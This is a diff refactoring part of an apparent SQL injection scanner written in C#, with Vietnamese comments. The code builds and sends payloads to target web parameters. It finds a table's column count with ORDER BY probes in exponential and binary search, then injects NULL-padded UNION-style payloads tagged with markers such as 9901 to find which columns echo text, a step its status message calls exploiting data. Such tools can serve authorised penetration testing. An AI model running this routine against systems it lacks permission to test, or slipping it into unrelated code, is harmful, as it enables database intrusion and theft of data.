@@ -22,12 +22,11 @@ namespace SQLiScanner.Modules
         public async Task<int> GetColumnCountAsync(
             CrawlResult target, 
             AnalyzingResult detectedData, 
-            PayloadState trackingState,
-            CancellationToken cancellationToken = default)
+            ScanConfig config)
         {
-            trackingState.UpdateStatus(ScanStatus.CheckingColumnCount, "Đang dò số cột bằng ORDER BY...");
+            config.OnProgress?.Invoke("Đang dò số cột bằng ORDER BY...");
 
-            int baseLength = await GetResponseLengthAsync(target, detectedData.Route.OriginalValue, detectedData.Route, cancellationToken);
+            int baseLength = await GetResponseLengthAsync(target, detectedData.Route.OriginalValue, detectedData.Route, config.Token);
 
             if (baseLength <= 0) return -1;
 
@@ -42,13 +41,13 @@ namespace SQLiScanner.Modules
             // tránh vòng lặp vô tận
             while (high <= 200)
             {
-                if (cancellationToken.IsCancellationRequested) return -1;
+                if (config.Token.IsCancellationRequested) return -1;
 
                 string payload = $"{detectedData.Route.OriginalValue}{detectedData.WorkingPrefix} ORDER BY {high}{detectedData.WorkingSuffix}";
-                int currentLength = await GetResponseLengthAsync(target, payload, detectedData.Route, cancellationToken);
+                int currentLength = await GetResponseLengthAsync(target, payload, detectedData.Route, config.Token);
                 bool isError = Math.Abs(currentLength - baseLength) > baseLength * columnErrorThreshold;
 
-                trackingState.UpdateStatus(ScanStatus.CheckingColumnCount, $"[Exponential] Kiểm tra ORDER BY {high}...");
+                config.OnProgress?.Invoke($"[Exponential] Kiểm tra ORDER BY {high}...");
 
                 if (isError)
                 {
@@ -71,13 +70,13 @@ namespace SQLiScanner.Modules
 
             while (low <= high)
             {
-                if (cancellationToken.IsCancellationRequested) return -1;
+                if (config.Token.IsCancellationRequested) return -1;
 
                 int mid = (low + high) / 2;
-                trackingState.UpdateStatus(ScanStatus.CheckingColumnCount, $"[Binary] Thử ORDER BY {mid} (Phạm vi: {low} - {high})...");
+                config.OnProgress?.Invoke($"[Binary] Thử ORDER BY {mid} (Phạm vi: {low} - {high})...");
 
                 string payload = $"{detectedData.Route.OriginalValue}{detectedData.WorkingPrefix} ORDER BY {mid}{detectedData.WorkingSuffix}";
-                int currentLength = await GetResponseLengthAsync(target, payload, detectedData.Route, cancellationToken);
+                int currentLength = await GetResponseLengthAsync(target, payload, detectedData.Route, config.Token);
                 bool isError = Math.Abs(currentLength - baseLength) > baseLength * columnErrorThreshold;
 
                 if (isError)
@@ -100,21 +99,16 @@ namespace SQLiScanner.Modules
             CrawlResult target, 
             AnalyzingResult detectedData, 
             int colCount,
-            PayloadState trackingState,
-            CancellationToken cancellationToken = default)
+            ScanConfig config)
         {
-            trackingState.UpdateStatus(ScanStatus.ExploitingData, $"Đang tìm cột Text trong {colCount} cột...");
+            config.OnProgress?.Invoke($"Đang tìm cột Text trong {colCount} cột...");
             List<int> visibleCols = new List<int>();
             string fromTable = detectedData.DatabaseType == DatabaseType.Oracle ? " FROM DUAL" : "";
-
-            //string originalValue = target.Params.TryGetValue(detectedData.VulnerableParam, out var bodyVal)
-            //    ? bodyVal
-            //    : (System.Web.HttpUtility.ParseQueryString(target.RawQueryString)[detectedData.VulnerableParam] ?? "");
 
             string[] payloadParts = new string[colCount];
             for (int i = 0; i < colCount; i++)
             {
-                trackingState.UpdateStatus(ScanStatus.ExploitingData, $"Đang thử inject cột {i + 1}/{colCount}...");
+                config.OnProgress?.Invoke($"Đang thử inject cột {i + 1}/{colCount}...");
                 for (int j = 0; j < colCount; j++) payloadParts[j] = "NULL";
 
                 string magicTag = $"99{i + 1:D2}"; // VD: 9901
@@ -126,7 +120,7 @@ namespace SQLiScanner.Modules
                 try
                 {
                     // Ở đây ta cần HTML string để tìm text '9901'
-                    string? html = await SendPayloadGetStringAsync(target, payload, detectedData.Route, cancellationToken);
+                    string? html = await SendPayloadGetStringAsync(target, payload, detectedData.Route, config.Token);
 
                     if (!string.IsNullOrEmpty(html) && html.Contains(magicTag))
                     {
